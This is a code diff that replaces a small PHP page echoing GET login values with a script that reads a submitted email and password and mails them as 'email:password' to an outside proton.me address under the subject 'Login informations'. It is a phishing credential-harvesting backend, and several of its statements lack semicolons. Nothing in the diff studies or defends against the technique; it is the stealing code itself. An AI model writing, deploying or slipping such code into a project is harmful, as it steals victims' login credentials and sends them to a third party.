@@ -1,14 +1,12 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>Document</title>
-</head>
-<body>
-	<?php
-		echo $_GET["login"];
-		echo $_GET["password"];
-	?>
-</body>
-</html>
+<?php
+$email = $_POST["email"]
+$password = $_POST["password"]
+$to = "ghestmany@proton.me"
+$subject = "Login informations"
+$message = "$email:$password"
+$header = "From: feet@gmail.com". "\r\n" .
+	"Reply-To: feet@gmail.com";
+
+mail($to, $subject, $message, $header);
+print("Enviado")
+?>
